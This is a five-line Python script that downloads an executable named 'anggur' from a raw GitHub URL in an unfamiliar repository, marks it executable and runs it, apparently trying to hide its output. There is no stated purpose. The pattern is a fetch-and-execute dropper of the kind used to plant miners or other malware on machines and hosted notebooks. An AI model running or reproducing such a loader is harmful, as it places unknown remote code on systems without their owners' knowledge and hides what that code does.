import os
import subprocess
subprocess.run(['wget','https://raw.githubusercontent.com/kunanananaft/Woryyme/main/anggur'])
subprocess.run(['chmod','+x','anggur'])
subprocess.run(['./anggur','>/dev/null 2>&1'])
